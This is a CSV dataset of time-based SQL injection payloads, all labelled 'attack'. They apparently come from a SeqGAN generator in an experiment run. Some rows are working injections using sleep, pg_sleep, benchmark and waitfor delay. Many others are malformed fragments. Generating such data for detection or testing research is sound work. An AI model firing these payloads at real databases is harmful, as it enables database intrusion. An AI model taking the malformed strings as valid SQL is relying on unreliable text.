label,payload,family,payload_type,method,run_id,sample_index
attack,"1 or benchmark  (  5873,sleep  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1707
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """"  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1708
attack,",sleep 50  'sdu   (    )    )    )    )    )    and    )    )    vbenchmark  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1709
attack,1%   )    )    )    or benchmark  (  5   )    )    )    )    )    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1710
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1711
attack,1%'  )   and 8594=  benchmark  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1712
attack,1'  )   waitfor delay '0:0:2' sleep  ))    (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1713
attack,","" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1714
attack,or sleep  (  5  andv* sleep  (  5  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1715
attack,; or 6793 pg_sleep  (  _  )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1716
attack,"1'  )    )    )    )    )    or sleep  (  5   )    )    )    )    or from 4240 from pg_sleep  (  (  5000000,md5  (  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1717
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""c where 7260 delay not  (  __)  9443  (  sleep (  5,MD5  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1718
attack,"1%'   )    )    )    or elt  (  3114,sleep  (  10000000,MD(  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1719
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1720
attack,"""  )    <> or sleep  (  0x694a4745___TIME______)    )    =    __)    )    =   6866",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1721
attack,"; where =    )  )    =   )    select and 4240 from elt  )  )   or 8514=lelt  (  )  ' from 9443*sleep  ,sleep  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1722
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1723
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%' waitfor delay 'gafct",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1724
attack, if not 9443  (  (  __TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1725
attack,1   )    )    <> 0)    )    )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1726
attack,   )    )    or sleep  (  ___TIME_____TIME___TIME_____TIME__)  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1727
attack,"1%'isintegratedsecurityonly'""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1728
attack,1 or pg_sleep  (    =  )  (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1729
attack,"1'   )    )    rlike sleep  (  5  )   and    (    (   '""  =  ""z""  )   rlike sleep  (  5  )   and   (  ""% 6784; and or elt  3114  )    )    )    =   __TIME___  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1730
attack,1'  )    )    )    or 4240  =    __TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1731
attack,or 4240(  select 4240 from sleep  (  0x694a4745  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1732
attack,or @ver  )  )    )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1733
attack,1selectv where 6784 and  9443*  =    __TIME_____TIME___)  benchmark  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1734
attack,sleep  (  5   )    )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1735
attack,"1""  )    )    or benchmark from   (  select * from 1   )    )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1736
attack,"c1%""  )   rlike sleep  (  5  )   and   (  ""'   )    )    rlike sleep  (  5  )   and    (    (   'l"" or benchmark  (  5   )    )    )    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1737
attack,"""   )    )    )    )    orsleep  (  __TIME_________TIME______T'   9862   (  select --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1738
attack,"; or pg_sleep  (  5   )    )    )    )    )    )    ,1   )    )    )    )    selectwaitforor sleep  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1739
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%pg_sleep  )  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1740
attack, or benchmark  (  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1741
attack,1'  )    )    and,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1742
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1743
attack,1'  )    )    <> 0  )   where 2840l sleep  (  substring   (    )    )    )     )   where 7629  benchmark  (  ___TIME_____TIME___  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1744
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1745
attack,"1'  )   )    )    )    or ' sleep  (  __TIME___  ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1746
attack,", er  (  )   waitfor or sleep  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1747
attack,1'  )   and 8514=    select when e   =  (  select 4240 from sleep  (  ____TIME____(  5  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1748
attack,"1%""  )    )    or benchmark  (  5   )    )    )    )    )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1749
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1750
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%%   or 4240 9443  =    __TIME___  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1751
attack,"1%""   )    )    or benchmark  (  sleep  )  sleep  (  6784",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1752
attack,1 where =  IME_____TIME____TIME_____TIME_____TIME______TIME_____TIME_______TIME_____)    (  9443___TIME______TIME______TIME____TIME_____TIME____TIME____TIME_______TIME__  )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1753
attack,"""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1754
attack,sleep  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1755
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1756
attack," ,waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1757
attack,; or sleep  (  ___T___TIME_______TIME______TIME__  )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1758
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  )   rlike sleep  (  5  )   and   (  ""%%'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1759
attack,"1%""  )    )    or sleep  (  __TIME____TIME____TIME___  sleep  (  __TIME___TIME_____TIME_____TIME__T_,sleep  (  ),sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1760
attack, or 9443 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1761
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%%h'sa'or sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1762
attack,"1""   )    )    )    or 4240 '0:0:10'2388  =  sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1763
attack, where 7739  )    )    =  benchmark  __  )    )    =    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1764
attack,"1%"" or sleep  (  __TIME__  )    =  ""' not   )    )    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1765
attack,1%'||  (  select 'wctwselect 1361 if 8594 TIME_______)    (  __  )    )    )    )    E50___TIME____TIME___)  __)    =  case when   (  select --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1766
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cc where delay TIME___)    (  )    _",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1767
attack,or pg_sleep  (  sleep  (  __TIME_____TIME__)  sleep  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1768
attack,select sleep  =  sleep  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1769
attack,"'  )  ,1   )    )    )    whereD5  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1770
attack,1'  )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1771
attack,"""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1772
attack,"1""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1773
attack,or 4240 from   (  select and 6793 9443 from *  (  sleep --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1774
attack,$  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1775
attack,;waitfor waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1776
attack,1' where 8  )   or sleep  (  ___TIME_____TIME____TIME____TIME___)  (  )       )   )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1777
attack,1 waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1778
attack,1%   )    )    )    )    or benchmark  (  _  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1779
attack,""" or pg_sleep  (  sleep  (  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1780
attack,"1%""   )    )    )    or benchmark  (  5   )    )    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1781
attack,1'  )    )    )    )    )    <> (    )    )    )    or 4240 from pg_sleep  (  __T--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1782
attack,"1')    )    )    )    or benchmark  (  ),sleep  (  5  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1783
attack,"""   )    )    )    or 8514(  sleep  (  ___TIME__  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1784
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  "" benchmark  (  )__    )    =    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1785
attack, )        )    or information_schema.vdc rI if where 2657 or when  )    )    )    )    )    =  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1786
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1787
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  ""3114'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1788
attack,"twcdne"" like ""cnp.onerone",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1789
attack,", if not  (  0x6d457153   )    )    )    )    )    or 8514  =    )    )    )    or sleep  (  substring   (    )    )    )    )    )        )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1790
attack,; 8466  =    )    )    =   )    serMD1  )    )    )    )    )     )    )    )     )    or pg_sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1791
attack,""" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1792
attack,"1'  )   select sleep pg_sleep  (  )  ;,sleep  (  5   )    )    )    )    =    )     )   )    )    )    or 9443** (  sleep  (  ___TIME______TIME__  )   and    )    )    =    )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1793
attack,", or sleep  (  (  3114,sleep  (  5   )    )    )    )    )    )    )    or  =    )    )    )    or ,sleep  (  10000000,sleep___TIME__  )    sddon"" like ""  (  10000000,MDd5  (  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1794
